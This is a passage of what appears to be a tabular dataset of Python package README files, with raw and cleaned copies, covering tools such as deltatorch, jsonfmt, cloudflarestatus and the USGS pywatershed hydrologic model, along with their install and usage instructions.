After the table is ready we can use the `create_pytorch_dataloader` function to create a PyTorch DataLoader :
```python
from deltatorch import create_pytorch_dataloader

def create_data_loader(path:str, length:int, batch_size:int):

    return create_pytorch_dataloader(
        # Path to the DeltaLake table
        path,
        # Length of the table. Can be easily pre-calculated using spark.read.load(path).count()
        length,
        # Field used as a source (X)
        src_field=""image"",
        # Target field (Y)
        target_field=""label"",
        # Autoincrement ID field
        id_field=""id"",
        # Load image using Pillow
        load_pil=True,
        # Number of readers 
        num_workers=2,
        # Shuffle data inside the record batches
        shuffle=True,
        # Batch size        
        batch_size=batch_size,
    )
```","# deltatorch

![![image](https://github.com/mshtelma/deltatorch/workflows/build/badge.svg)](https://github.com/mshtelma/deltatorch/actions/workflows/ci.yml/badge.svg)
![![image](https://github.com/mshtelma/deltatorch/workflows/build/badge.svg)](https://github.com/mshtelma/deltatorch/actions/workflows/flake8.yml/badge.svg)

## Concept

`deltatorch` allows users to directly use  `DeltaLake` tables as a data source for training using PyTorch. 
Using  `deltatorch`, users can create a PyTorch  `DataLoader` to load the training data. 
We support distributed training using PyTorch DDP as well. 



## Usage

### Requirements

- Python Version \> 3.8
- `pip` or `conda`

### Installation

- with `pip`:

```
pip install git+https://github.com/mshtelma/deltatorch
```
### Create PyTorch DataLoader to read our DeltaLake table

To utilize `deltatorch` at first, we will need a DeltaLake table containing training data we would like to use for training your PyTorch deep learning model. 
There is a requirement: this table must have an autoincrement ID field. This field is used by `deltatorch` for sharding and parallelization of loading. 
After that, we can use the `create_pytorch_dataloader` function to create PyTorch DataLoader, which can be used directly during training. 
Below you can find an example of creating a DataLoader for the following table schema :


```sql
CREATE TABLE TRAINING_DATA 
(   
    image BINARY,   
    label BIGINT,   
    id INT
) 
USING delta LOCATION 'path' 
```

After the table is ready we can use the `create_pytorch_dataloader` function to create a PyTorch DataLoader :
```python
from deltatorch import create_pytorch_dataloader

def create_data_loader(path:str, length:int, batch_size:int):

    return create_pytorch_dataloader(
        # Path to the DeltaLake table
        path,
        # Length of the table. Can be easily pre-calculated using spark.read.load(path).count()
        length,
        # Field used as a source (X)
        src_field=""image"",
        # Target field (Y)
        target_field=""label"",
        # Autoincrement ID field
        id_field=""id"",
        # Load image using Pillow
        load_pil=True,
        # Number of readers 
        num_workers=2,
        # Shuffle data inside the record batches
        shuffle=True,
        # Batch size        
        batch_size=batch_size,
    )
```",mshtelma/deltatorch
torch-train-loop,https://github.com/jsacrist/jsac-torch-train-loop/,3,820,820,"# jsac's `torch_train_loop`

`torch_train_loop` is a general-purpose train-loop for [PyTorch][PyTorch] models, with some convenient features built-in:
  - Integration with [TensorBoard][TensorBoard] (via PyTorch's [SummaryWriter][SummaryWriter]) for
    plotting:
    - Training loss
    - Validation loss
    - Additional optional metrics
  - Progress bar(s) (via [tqdm][tqdm]) for Jupyter Notebooks or CLI environments.
  - [Early stopping][EarlyStopping] overfitting detection.


[PyTorch]: https://github.com/pytorch/pytorch
[TensorBoard]: https://github.com/tensorflow/tensorboard
[SummaryWriter]: https://pytorch.org/docs/stable/tensorboard.html?highlight=summarywriter#torch.utils.tensorboard.writer.SummaryWriter
[tqdm]: https://github.com/tqdm/tqdm
[EarlyStopping]: https://en.wikipedia.org/wiki/Early_stopping
","# jsac's `torch_train_loop`

`torch_train_loop` is a general-purpose train-loop for [PyTorch][PyTorch] models, with some convenient features built-in:
  - Integration with [TensorBoard][TensorBoard] (via PyTorch's [SummaryWriter][SummaryWriter]) for
    plotting:
    - Training loss
    - Validation loss
    - Additional optional metrics
  - Progress bar(s) (via [tqdm][tqdm]) for Jupyter Notebooks or CLI environments.
  - [Early stopping][EarlyStopping] overfitting detection.


[PyTorch]: https://github.com/pytorch/pytorch
[TensorBoard]: https://github.com/tensorflow/tensorboard
[SummaryWriter]: https://pytorch.org/docs/stable/tensorboard.html?highlight=summarywriter#torch.utils.tensorboard.writer.SummaryWriter
[tqdm]: https://github.com/tqdm/tqdm
[EarlyStopping]: https://en.wikipedia.org/wiki/Early_stopping
",jsacrist/jsac-torch-train-loop
fhirsearchhelper,https://github.com/SmartChartSuite/FHIRSearchHelper,3,2784,2608,"# FHIR Search Helper

<a href=""https://pypi.python.org/pypi/fhirsearchhelper"" rel=""PyPi Package Link"">![PyPi Package Link](https://img.shields.io/pypi/v/fhirsearchhelper.svg)</a>
<a href=""https://pypi.python.org/pypi/fhirsearchhelper"" rel=""Supported Python versions"">![Supported Python versions](https://img.shields.io/pypi/pyversions/fhirsearchhelper.svg)</a>
[![Downloads](https://pepy.tech/badge/fhirsearchhelper)](https://pepy.tech/project/fhirsearchhelper)

A Python package to support FHIR Searching in contexts where needed search parameters are not supported

## A Note on CapabilityStatements

In their current form, `CapabilityStatement`s do not have a way to express when a search parameter for a resource is conditionally accepted. For example, in the Epic R4 `CapabilityStatement`, for the `Condition` resource, there exists a listed search parameter of `code`. In the description, there is a note that this search parameter is only accepted when the `category` is equal to `infection`. The only way that this conditional information would be known is by manual reading of the description. To alleviate this issue, and to avoid extreme custom handling in this package, currently you must edit the `CapabilityStatement` of any server with which you would like to use this package and add custom extensions to the search parameter. Keeping with the above example of the search parameter `code` for the `Condition` resource, here is what the `CapabilityStatement.rest[0].resource.where(type = 'Condition').searchParam.where(name = 'code')` element looks like:

```
{
    ""name"": ""code"",
    ""type"": ""token"",
    ""documentation"": ""Search for Conditions with a specified code. This is only used when searching for infections."",
    ""extension"": [
        {
            ""url"": ""true-when"",
            ""valueString"": ""category==infection""
        }
    ]
}
```

Here we have added an extension with a url of `true-when` that is a machine readable statement denoting when a search parameter is accepted by the server. It currently only supports == to show equality and in to show membership of a list (e.g. ""category in [infection, health-problem]""). This also works for when a search parameter is limited in the values it will successfully search for. For example, here is what the `CapabilityStatement.rest[0].resource.where(type = 'Condition').searchParam.where(name = 'category')` element looks like:

```
{
    ""name"": ""category"",
    ""type"": ""token"",
    ""documentation"": ""Search for Condition resources by category."",
    ""extension"": [
        {
            ""url"": ""true-when"",
            ""valueString"": ""category in [dental-finding, encounter-diagnosis, genomics, health-concern, infection, medical-history, problem-list-item, reason-for-visit]""
        }
    ]
}
```
","# FHIR Search Helper

![PyPi Package Link](https://img.shields.io/pypi/v/fhirsearchhelper.svg)
![Supported Python versions](https://img.shields.io/pypi/pyversions/fhirsearchhelper.svg)
[![Downloads](https://pepy.tech/badge/fhirsearchhelper)](https://pepy.tech/project/fhirsearchhelper)

A Python package to support FHIR Searching in contexts where needed search parameters are not supported

## A Note on CapabilityStatements

In their current form, `CapabilityStatement`s do not have a way to express when a search parameter for a resource is conditionally accepted. For example, in the Epic R4 `CapabilityStatement`, for the `Condition` resource, there exists a listed search parameter of `code`. In the description, there is a note that this search parameter is only accepted when the `category` is equal to `infection`. The only way that this conditional information would be known is by manual reading of the description. To alleviate this issue, and to avoid extreme custom handling in this package, currently you must edit the `CapabilityStatement` of any server with which you would like to use this package and add custom extensions to the search parameter. Keeping with the above example of the search parameter `code` for the `Condition` resource, here is what the `CapabilityStatement.rest[0].resource.where(type = 'Condition').searchParam.where(name = 'code')` element looks like:

```
{
    ""name"": ""code"",
    ""type"": ""token"",
    ""documentation"": ""Search for Conditions with a specified code. This is only used when searching for infections."",
    ""extension"": [
        {
            ""url"": ""true-when"",
            ""valueString"": ""category==infection""
        }
    ]
}
```

Here we have added an extension with a url of `true-when` that is a machine readable statement denoting when a search parameter is accepted by the server. It currently only supports == to show equality and in to show membership of a list (e.g. ""category in [infection, health-problem]""). This also works for when a search parameter is limited in the values it will successfully search for. For example, here is what the `CapabilityStatement.rest[0].resource.where(type = 'Condition').searchParam.where(name = 'category')` element looks like:

```
{
    ""name"": ""category"",
    ""type"": ""token"",
    ""documentation"": ""Search for Condition resources by category."",
    ""extension"": [
        {
            ""url"": ""true-when"",
            ""valueString"": ""category in [dental-finding, encounter-diagnosis, genomics, health-concern, infection, medical-history, problem-list-item, reason-for-visit]""
        }
    ]
}
```
",smartchartsuite/fhirsearchhelper
osu-stream-speed,https://github.com/cmyui/osu-stream-speed,0,0,0,,,cmyui/osu-stream-speed
cloudflarestatus,https://github.com/ayeowch/cloudflarestatus,2,1732,1732,"# Cloudflarestatus
Python package to parse Cloudflare System Status from https://www.cloudflarestatus.com

## Quickstart

### Install

```
$ pip install cloudflarestatus
```

### Command-line usage 1

Get status for a data center:

```
$ cloudflarestatus -d hba
{""HBA"": {""code"": ""HBA"", ""name"": ""Hobart, Australia"", ""status"": ""partial_outage"", ""timestamp"": 1682596723}}
```

### Command-line usage 2

Pipe to `jq` (a separate program) to format the JSON output:

```
$ cloudflarestatus -d hba syd | jq
{
  ""HBA"": {
    ""code"": ""HBA"",
    ""name"": ""Hobart, Australia"",
    ""status"": ""partial_outage"",
    ""timestamp"": 1682596723
  },
  ""SYD"": {
    ""code"": ""SYD"",
    ""name"": ""Sydney, NSW, Australia"",
    ""status"": ""operational"",
    ""timestamp"": 1682596723
  }
}
```

### Python usage 1

Get status for all data centers.

```
>>> import cloudflarestatus
>>> cloudflarestatus.dc()
{'ACC': {'code': 'ACC', 'name': 'Accra, Ghana', 'status': 'operational', 'timestamp': 1682596723},
..
'ZRH': {'code': 'ZRH', 'name': 'Zürich, Switzerland', 'status': 'operational', 'timestamp': 1682596723}
```

### Python usage 2

Get status for a data center:

```
>>> import cloudflarestatus
>>> cloudflarestatus.dc('HBA')
{'HBA': {'code': 'HBA', 'name': 'Hobart, Australia', 'status': 'partial_outage', 'timestamp': 1682596723}}
```

### Note

- Internally, `cloudflarestatus` caches response from https://www.cloudflarestatus.com for up to 60 seconds.
- Input for data center code is case-insensitive.

## Package development

### Setup

```
~/.pyenv/versions/3.11.2/bin/python -m venv venv
source venv/bin/activate
pip install -r requirements-dev.txt
```

### Test

```
./test.sh
```

### Format

```
./format.sh
```

### Build

```
./build.sh
```
","# Cloudflarestatus
Python package to parse Cloudflare System Status from https://www.cloudflarestatus.com

## Quickstart

### Install

```
$ pip install cloudflarestatus
```

### Command-line usage 1

Get status for a data center:

```
$ cloudflarestatus -d hba
{""HBA"": {""code"": ""HBA"", ""name"": ""Hobart, Australia"", ""status"": ""partial_outage"", ""timestamp"": 1682596723}}
```

### Command-line usage 2

Pipe to `jq` (a separate program) to format the JSON output:

```
$ cloudflarestatus -d hba syd | jq
{
  ""HBA"": {
    ""code"": ""HBA"",
    ""name"": ""Hobart, Australia"",
    ""status"": ""partial_outage"",
    ""timestamp"": 1682596723
  },
  ""SYD"": {
    ""code"": ""SYD"",
    ""name"": ""Sydney, NSW, Australia"",
    ""status"": ""operational"",
    ""timestamp"": 1682596723
  }
}
```

### Python usage 1

Get status for all data centers.

```
>>> import cloudflarestatus
>>> cloudflarestatus.dc()
{'ACC': {'code': 'ACC', 'name': 'Accra, Ghana', 'status': 'operational', 'timestamp': 1682596723},
..
'ZRH': {'code': 'ZRH', 'name': 'Zürich, Switzerland', 'status': 'operational', 'timestamp': 1682596723}
```

### Python usage 2

Get status for a data center:

```
>>> import cloudflarestatus
>>> cloudflarestatus.dc('HBA')
{'HBA': {'code': 'HBA', 'name': 'Hobart, Australia', 'status': 'partial_outage', 'timestamp': 1682596723}}
```

### Note

- Internally, `cloudflarestatus` caches response from https://www.cloudflarestatus.com for up to 60 seconds.
- Input for data center code is case-insensitive.

## Package development

### Setup

```
~/.pyenv/versions/3.11.2/bin/python -m venv venv
source venv/bin/activate
pip install -r requirements-dev.txt
```

### Test

```
./test.sh
```

### Format

```
./format.sh
```

### Build

```
./build.sh
```
",ayeowch/cloudflarestatus
streamlit-chatbot,https://github.com/AI-Yash/st-chat,1,700,700,"# st-chat

Streamlit Component, for a Chat-bot UI, [example app](https://share.streamlit.io/ai-yash/st-chat/main/examples/chatbot.py)

authors - [@yashppawar](https://github.com/yashppawar) & [@YashVardhan-AI](https://github.com/yashvardhan-ai)

## Installation

Install `streamlit-chat` with pip
```bash
pip install streamlit-chat 
```

usage, import the `message` function from `streamlit_chat`
```py
import streamlit as st
from streamlit_chat import message

message(""My message"") 
message(""Hello bot!"", is_user=True)  # align's the message to the right
```
   
### Screenshot

![chatbot-og](https://user-images.githubusercontent.com/90775147/210397700-5ab9e00d-a61b-4bc9-a34a-b5bd4454b084.png)


","# st-chat

Streamlit Component, for a Chat-bot UI, [example app](https://share.streamlit.io/ai-yash/st-chat/main/examples/chatbot.py)

authors - [@yashppawar](https://github.com/yashppawar) & [@YashVardhan-AI](https://github.com/yashvardhan-ai)

## Installation

Install `streamlit-chat` with pip
```bash
pip install streamlit-chat 
```

usage, import the `message` function from `streamlit_chat`
```py
import streamlit as st
from streamlit_chat import message

message(""My message"") 
message(""Hello bot!"", is_user=True)  # align's the message to the right
```
   
### Screenshot

![chatbot-og](https://user-images.githubusercontent.com/90775147/210397700-5ab9e00d-a61b-4bc9-a34a-b5bd4454b084.png)


",ai-yash/st-chat
jsonfmt,https://github.com/seamile/jsonfmt,0,3560,3560,"# JSON Formator

**jsonfmt** is a json object formatting tool.

## Features

1. Print the json object in pretty format from files or stdin.
2. Compress the json object into a single line without spaces.
3. Output part of a large json object via jsonpath.

## Install

```shell
$ pip install jsonfmt
```

## Usage

```shell
$ jsonfmt [-h] [-c] [-O] [-p JSONPATH] [json_files ...]
```

- positional arguments:

     - `json_files`   the json files that will be processed

- options:

     - `-h, --help`: show this help message and exit.
     - `-c`: compression the json object in the files or stdin.
     - `-O`: overwrite to the json file.
     - `-p JSONPATH`: output part of json object via jsonpath.
     - `-v`: show the version.


## Example

In the file example.json there is a compressed json object.

1. Pretty print from json file.

     ```shell
     $ jsonfmt example.json
     ```

     ouput:
     ```json
     {
          ""age"": 23,
          ""gender"": ""male"",
          ""history"": [
               {
                    ""action"": ""eat"",
                    ""date"": ""2021-03-02"",
                    ""items"": [
                         {
                              ""bar"": 222,
                              ""foo"": 111
                         },
                         {
                              ""bar"": -222,
                              ""foo"": -111
                         }
                    ]
               },
               {
                    ""action"": ""drink"",
                    ""date"": ""2022-11-01"",
                    ""items"": [
                         {
                              ""bar"": 444,
                              ""foo"": 333
                         },
                         {
                              ""bar"": -444,
                              ""foo"": -333
                         }
                    ]
               },
               {
                    ""action"": ""walk"",
                    ""date"": ""2023-04-27"",
                    ""items"": [
                         {
                              ""bar"": 666,
                              ""foo"": 555
                         },
                         {
                              ""bar"": -666,
                              ""foo"": -555
                         }
                    ]
               }
          ],
          ""name"": ""bob""
     }
    ```

     Of course, you can use the `-O` parameter to overwrite the file with the result:

     ```shell
     $ jsonfmt -O example.json
     ```

2. Compress the json string from stdin.

     ```shell
     $ echo '{
          ""name"": ""alex"",
          ""age"": 21,
          ""items"": [""pen"", ""ruler"", ""phone""]
     }' | jsonfmt -c
     ```

     ouput:
     ```json
     {""age"":21,""items"":[""pen"",""ruler"",""phone""],""name"":""alex""}
     ```

3. Use jsonpath to match part of a json object.

     **jsonfmt** uses a simplified jsonpath syntax.

     - It matches json objects starting from the root node.
     - You can use keys to match dictionaries and indexes to match lists, and use `/` to separate different levels.

          ```shell
          $ jsonfmt -p 'history/0/date' example.json
          ```

          ouput:
          ```json
          ""2021-03-02""
          ```

     - If you want to match all items in a list, just use `*` to match.

          ```shell
          $ jsonfmt -p 'history/*/action' example.json
          ```

          ouput:
          ```json
          [
               ""eat"",
               ""drink"",
               ""walk""
          ]
          ```
","# JSON Formator

**jsonfmt** is a json object formatting tool.

## Features

1. Print the json object in pretty format from files or stdin.
2. Compress the json object into a single line without spaces.
3. Output part of a large json object via jsonpath.

## Install

```shell
$ pip install jsonfmt
```

## Usage

```shell
$ jsonfmt [-h] [-c] [-O] [-p JSONPATH] [json_files ...]
```

- positional arguments:

     - `json_files`   the json files that will be processed

- options:

     - `-h, --help`: show this help message and exit.
     - `-c`: compression the json object in the files or stdin.
     - `-O`: overwrite to the json file.
     - `-p JSONPATH`: output part of json object via jsonpath.
     - `-v`: show the version.


## Example

In the file example.json there is a compressed json object.

1. Pretty print from json file.

     ```shell
     $ jsonfmt example.json
     ```

     ouput:
     ```json
     {
          ""age"": 23,
          ""gender"": ""male"",
          ""history"": [
               {
                    ""action"": ""eat"",
                    ""date"": ""2021-03-02"",
                    ""items"": [
                         {
                              ""bar"": 222,
                              ""foo"": 111
                         },
                         {
                              ""bar"": -222,
                              ""foo"": -111
                         }
                    ]
               },
               {
                    ""action"": ""drink"",
                    ""date"": ""2022-11-01"",
                    ""items"": [
                         {
                              ""bar"": 444,
                              ""foo"": 333
                         },
                         {
                              ""bar"": -444,
                              ""foo"": -333
                         }
                    ]
               },
               {
                    ""action"": ""walk"",
                    ""date"": ""2023-04-27"",
                    ""items"": [
                         {
                              ""bar"": 666,
                              ""foo"": 555
                         },
                         {
                              ""bar"": -666,
                              ""foo"": -555
                         }
                    ]
               }
          ],
          ""name"": ""bob""
     }
    ```

     Of course, you can use the `-O` parameter to overwrite the file with the result:

     ```shell
     $ jsonfmt -O example.json
     ```

2. Compress the json string from stdin.

     ```shell
     $ echo '{
          ""name"": ""alex"",
          ""age"": 21,
          ""items"": [""pen"", ""ruler"", ""phone""]
     }' | jsonfmt -c
     ```

     ouput:
     ```json
     {""age"":21,""items"":[""pen"",""ruler"",""phone""],""name"":""alex""}
     ```

3. Use jsonpath to match part of a json object.

     **jsonfmt** uses a simplified jsonpath syntax.

     - It matches json objects starting from the root node.
     - You can use keys to match dictionaries and indexes to match lists, and use `/` to separate different levels.

          ```shell
          $ jsonfmt -p 'history/0/date' example.json
          ```

          ouput:
          ```json
          ""2021-03-02""
          ```

     - If you want to match all items in a list, just use `*` to match.

          ```shell
          $ jsonfmt -p 'history/*/action' example.json
          ```

          ouput:
          ```json
          [
               ""eat"",
               ""drink"",
               ""walk""
          ]
          ```
",seamile/jsonfmt
goggle0,https://github.com/siwon12/goggle0,0,1448,1418,"# goggle0

[![pypi-image]][pypi-url]
[![license-image]][license-url]
[![version-image]][release-url]
[![release-date-image]][release-url]
[![jupyter-book-image]][docs-url]

<!-- Links: -->
[pypi-image]: https://img.shields.io/pypi/v/goggle0
[license-image]: https://img.shields.io/github/license/siwon12/goggle0
[license-url]: https://github.com/siwon12/goggle0/blob/main/LICENSE
[version-image]: https://img.shields.io/github/v/release/siwon12/goggle0?sort=semver
[release-date-image]: https://img.shields.io/github/release-date/siwon12/goggle0
[release-url]: https://github.com/siwon12/goggle0/releases
[jupyter-book-image]: https://jupyterbook.org/en/stable/_images/badge.svg

[repo-url]: https://github.com/siwon12/goggle0
[pypi-url]: https://pypi.org/project/goggle0
[docs-url]: https://siwon12.github.io/goggle0
[changelog]: https://github.com/siwon12/goggle0/blob/main/CHANGELOG.md
[contributing guidelines]: https://github.com/siwon12/goggle0/blob/main/CONTRIBUTING.md
<!-- Links: -->

goggle0 project

- Documentation: [https://siwon12.github.io/goggle0][docs-url]
- GitHub: [https://github.com/siwon12/goggle0][repo-url]
- PyPI: [https://pypi.org/project/goggle0][pypi-url]

goggle0 pypi project

## Changelog

See the [CHANGELOG] for more information.

## Contributing

Contributions are welcome! Please see the [contributing guidelines] for more information.

## License

This project is released under the [MIT License][license-url].

","# goggle0

[![pypi-image]][pypi-url]
[![license-image]][license-url]
[![version-image]][release-url]
[![release-date-image]][release-url]
[![jupyter-book-image]][docs-url]


[pypi-image]: https://img.shields.io/pypi/v/goggle0
[license-image]: https://img.shields.io/github/license/siwon12/goggle0
[license-url]: https://github.com/siwon12/goggle0/blob/main/LICENSE
[version-image]: https://img.shields.io/github/v/release/siwon12/goggle0?sort=semver
[release-date-image]: https://img.shields.io/github/release-date/siwon12/goggle0
[release-url]: https://github.com/siwon12/goggle0/releases
[jupyter-book-image]: https://jupyterbook.org/en/stable/_images/badge.svg

[repo-url]: https://github.com/siwon12/goggle0
[pypi-url]: https://pypi.org/project/goggle0
[docs-url]: https://siwon12.github.io/goggle0
[changelog]: https://github.com/siwon12/goggle0/blob/main/CHANGELOG.md
[contributing guidelines]: https://github.com/siwon12/goggle0/blob/main/CONTRIBUTING.md


goggle0 project

- Documentation: [https://siwon12.github.io/goggle0][docs-url]
- GitHub: [https://github.com/siwon12/goggle0][repo-url]
- PyPI: [https://pypi.org/project/goggle0][pypi-url]

goggle0 pypi project

## Changelog

See the [CHANGELOG] for more information.

## Contributing

Contributions are welcome! Please see the [contributing guidelines] for more information.

## License

This project is released under the [MIT License][license-url].

",siwon12/goggle0
pywatershed,https://github.com/EC-USGS/pywatershed,34,10280,10136,"# pywatershed
[![ci-badge](https://github.com/ec-usgs/pywatershed/workflows/CI/badge.svg?branch=main)](https://github.com/ec-usgs/pywatershed/actions?query=workflow%3ACI)
[![codecov-badge](https://codecov.io/gh/ec-usgs/pywatershed/branch/main/graph/badge.svg)](https://codecov.io/gh/ec-usgs/pywatershed)
[![Documentation Status](https://readthedocs.org/projects/pywatershed/badge/?version=latest)](https://pywatershed.readthedocs.io/en/latest/?badge=latest)

[![PyPI Version](https://img.shields.io/pypi/v/pywatershed.png)](https://pypi.python.org/pypi/pywatershed)
[![PyPI Status](https://img.shields.io/pypi/status/pywatershed.png)](https://pypi.python.org/pypi/pywatershed)
[![PyPI Versions](https://img.shields.io/pypi/pyversions/pywatershed.png)](https://pypi.python.org/pypi/pywatershed)

[//]: # (<img src=""https://raw.githubusercontent.com/ec-usgs/pywatershed/main/resources/images/prms_flow.png"" alt=""prms_flow"" style=""width:50;height:20"">)

Purpose
=========
The purpose of this repository is to refactor and redesign the [PRMS modeling
system](https://www.usgs.gov/software/precipitation-runoff-modeling-system-prms)
while maintaining its functionality. Code modernization is a step towards
unification with [MODFLOW 6 (MF6)](https://github.com/MODFLOW-USGS/modflow6).

The following motivations are taken from our
[AGU poster from December 2022](https://agu2022fallmeeting-agu.ipostersessions.com/default.aspx?s=05-E1-C6-40-DF-0D-4D-C7-4E-DE-D2-61-02-05-8F-0A)
which provides additional details on motivations, project status, and current
directions of this project as of approximately January 2023.

Goals of the USGS Enterprise Capacity (EC) project include:
  * A sustainable integrated, hydrologic modeling framework for the U.S. Geological Survey (USGS)
  * Interoperable modeling across the USGS, partner agencies, and academia

Goals for EC Watershed Modeling:
  * Couple the Precipitation-Runoff Modeling System (PRMS, e.g. Regan et al, 2018)  with MODFLOW 6 (MF6, e.g. Langevin et al, 2017) in a sustainable way
  * Redesign PRMS to be more modern and flexible
  * Prioritize process representations in the current National Hydrological Model (NHM) based on PRMS 5.2.1

Prototype an EC watershed model: ""pywatershed""
  * Redesign PRMS quickly in python
  * Couple to MF6 via BMI/XMI interface (Hughes et al, 2021; Hutton et al, 2020)
  * Establish a prototyping ground for EC codes that couples to the compiled framework: low cost proof of concepts (at the price of potentially less computational performance)
  * Enable process representation hypothesis testing
  * Use cutting-edge techniques and technologies to improve models
  * Machine learning, automatic differentiation
  * Address challenges of modeling across space and time scales
  * Transition prototype watershed model to compiled EC code


Installation and Python Environments
=====================================
This installation assumes you do not need to run automated tests locally. See
the following ""Developer Installation"" section for complete installation
instructions.

To install the software you will need Python >= 3.8. We recommend installing
the python package dependencies using anaconda or miniconda. Most users will
likely want to create the `pyws_nb` conda environment by running

```conda env create -f examples/examples_env.yml```.

One could also do

```pip install -r examples/exampes_env.txt```

but this is not guaranteed.

Once the environment is established, activate the environment and install
pywatershed

`conda activate pyws_nb; cd pywatershed; pip install .`

If you would like to compile the fortran computational kernels for
certain physical process representations (not required), you'll need a fortran
compiler and you will run

`export PYWS_FORTRAN=true; cd pywatershed;  pip install .`

See Developer Requirements below for more details.


Developer Installation
=======================
Git is required if you plan to contribute code back to the repository.

C and Fortran compilers are required. We are currently using gnu (gcc, gfortran)
11 and 12 as well as intel (icc, ifort) 2021 on Windows, Linux, and MacOS
(including Apple Silicon). Both of these are freely obtainable but the installation
process varies widely. We are looking for a conda-based approach to obtaining
compilers, but currently do not have a solution. Compilers are needed for
two applications:

  1. Compiling and running C/Fortran PRMS code to generate testing/verification data
  2. Compiling (installing) and running fortran backends/kernels for some hydrological
     process representations in pywatershed

On Apple Silicon, the PRMS source code is only currently known to compile with intel while
the fortran kernels in pywatershed only compile with gnu.

Python >= 3.8 is required. Three different python environments are specified within the repository.
These are:

* Minimal (for developing/testing), 'pyws': ci/requirements/environment.yml
* Notebooks (~= minimal + jupyter), 'pyws_nb': examples/examples_env.yml
* Documentation (only if you want to build the documentation), 'pyws-docs': ci/requirements/doc.yml

We recommend (because we test it in CI) using anacoda or miniconda to establish these environments
with the following commands

```conda env create -f path/to/env_of_choice.yml```

which will create the environment with ""name"" specified on the first line of the file, given before the path
to the file above.

More detailed python environment installation instructions using conda can be found in
`examples/00_python_virtual_env.ipynb`.

There are also .txt equivalents that can be used for installing from pip, like so:

```pip install -r env_of_choice.txt```

though these are not comprehensive installs as with conda and not tested.

Once the python environment and dependencies are established and activated (`conda activate env_of_choice`),
pywatershed is installed for development into that environment with the following command

`cd pywatershed; pip install -e .`

The numpy extension F2PY is used to provide fortran compiled kernels of core calculations to boost
performance. F2PY is documented [within numpy](https://numpy.org/doc/stable/f2py/index.html). This
repository is configured NOT to compile on install by default. Currently, we have not established
this compilation procedure for Windows. On linux and MacOS, compilation of fortran kernels on package
installation is achieved by the following code:

```
export SETUPTOOLS_ENABLE_FEATURES=""legacy-editable""
export CC=path/to/gcc  # for example
export FC=path/to/gfortran  # for example
export PYWS_FORTRAN=true
cd path/to/pywatershed
pip install -e .
```

Once the dependencies are available, we want to verify the software by running its test suite. The
following testing procedures are also covered in the notebook `examples/01_automated_testing.ipynb`.
To run the tests, we first need to generate the test data. This consists of running PRMS
and then converting the output to netcdf:

```
cd path/to/pywatershed/test_data/scripts
pytest -v -n=4 test_run_domains.py
pytest -v -n=8 test_nc_domains.py
```

Finally, run the tests themselves,

```
cd path/to/pywatershed/autotest
pytest -v -n=8
```

All tests should pass, XPASS, or XFAIL. XFAIL is an expected failure.


Contributing
============
We welcome community development! Please file Issues and/or Pull Requests in the appropriate places on github. The continuous
integration (CI) procedure is the first gate keeper for new code contribution. The CI procedure is defined by
`.github/workflows/ci.yaml`. This includes running the formatting and linting packages `isort`, `black`, and
`flake8` in addition to generating the test data and running the tests in `autotest/`. New codes need new tests so they can
be verified moving ahead in time.


Example Notebooks
==================
Jupyter notebooks containing examples are found in the
[examples/](https://github.com/EC-USGS/pywatershed/tree/main/examples) directory. Numbered notebooks are tested.
Notebooks 00 and 01 walk the user through the setting the python environment and running the software tests.
Notebook 02 demonstrates modeling with pywatershed. Non-numbered notebooks cover additional topics. These notebooks
are note yet covered by testing and so may be expected to have some issues until they are added to testing.


Overview of Repository Contents
==========
The contents of directories at this level is described. Therein you may discover another README.md for more information.

```
.github/    Github actions for deploying continuous integration (CI)
autotest/   pywatershed package testing using pytest
bin/        PRMS executables distributed
ci/         Python environments for CI
doc/        Package/code documentation source code
examples/   How to use the package, mostly jupyter notebooks
prms_src/   PRMS source used for generating executables in bin/
pywatershed/      Package source
reference/  Ancillary materials for development
resources/  Static stuff like images
test_data/  Data used for automated testing
```


Disclaimer
==========

This information is preliminary or provisional and is subject to revision. It is being provided to meet the need for timely best science. The information has not received final approval by the U.S. Geological Survey (USGS) and is provided on the condition that neither the USGS nor the U.S. Government shall be held liable for any damages resulting from the authorized or unauthorized use of the information.

From: https://www2.usgs.gov/fsp/fsp_disclaimers.asp#5

This software is in the public domain because it contains materials that originally came from the U.S. Geological Survey, an agency of the United States Department of Interior. For more information, see the [official USGS copyright policy](https://www.usgs.gov/information-policies-and-instructions/copyrights-and-credits ""official USGS copyright policy"")

Although this software program has been used by the USGS, no warranty, expressed or implied, is made by the USGS or the U.S. Government as to the accuracy and functioning of the program and related program material nor shall the fact of distribution constitute any such warranty, and no responsibility is assumed by the USGS in connection therewith.
This software is provided ""AS IS.""
","# pywatershed
[![ci-badge](https://github.com/ec-usgs/pywatershed/workflows/CI/badge.svg?branch=main)](https://github.com/ec-usgs/pywatershed/actions?query=workflow%3ACI)
[![codecov-badge](https://codecov.io/gh/ec-usgs/pywatershed/branch/main/graph/badge.svg)](https://codecov.io/gh/ec-usgs/pywatershed)
[![Documentation Status](https://readthedocs.org/projects/pywatershed/badge/?version=latest)](https://pywatershed.readthedocs.io/en/latest/?badge=latest)

[![PyPI Version](https://img.shields.io/pypi/v/pywatershed.png)](https://pypi.python.org/pypi/pywatershed)
[![PyPI Status](https://img.shields.io/pypi/status/pywatershed.png)](https://pypi.python.org/pypi/pywatershed)
[![PyPI Versions](https://img.shields.io/pypi/pyversions/pywatershed.png)](https://pypi.python.org/pypi/pywatershed)

[//]: # ()

Purpose
=========
The purpose of this repository is to refactor and redesign the [PRMS modeling
system](https://www.usgs.gov/software/precipitation-runoff-modeling-system-prms)
while maintaining its functionality. Code modernization is a step towards
unification with [MODFLOW 6 (MF6)](https://github.com/MODFLOW-USGS/modflow6).

The following motivations are taken from our
[AGU poster from December 2022](https://agu2022fallmeeting-agu.ipostersessions.com/default.aspx?s=05-E1-C6-40-DF-0D-4D-C7-4E-DE-D2-61-02-05-8F-0A)
which provides additional details on motivations, project status, and current
directions of this project as of approximately January 2023.

Goals of the USGS Enterprise Capacity (EC) project include:
  * A sustainable integrated, hydrologic modeling framework for the U.S. Geological Survey (USGS)
  * Interoperable modeling across the USGS, partner agencies, and academia

Goals for EC Watershed Modeling:
  * Couple the Precipitation-Runoff Modeling System (PRMS, e.g. Regan et al, 2018)  with MODFLOW 6 (MF6, e.g. Langevin et al, 2017) in a sustainable way
  * Redesign PRMS to be more modern and flexible
  * Prioritize process representations in the current National Hydrological Model (NHM) based on PRMS 5.2.1

Prototype an EC watershed model: ""pywatershed""
  * Redesign PRMS quickly in python
  * Couple to MF6 via BMI/XMI interface (Hughes et al, 2021; Hutton et al, 2020)
  * Establish a prototyping ground for EC codes that couples to the compiled framework: low cost proof of concepts (at the price of potentially less computational performance)
  * Enable process representation hypothesis testing
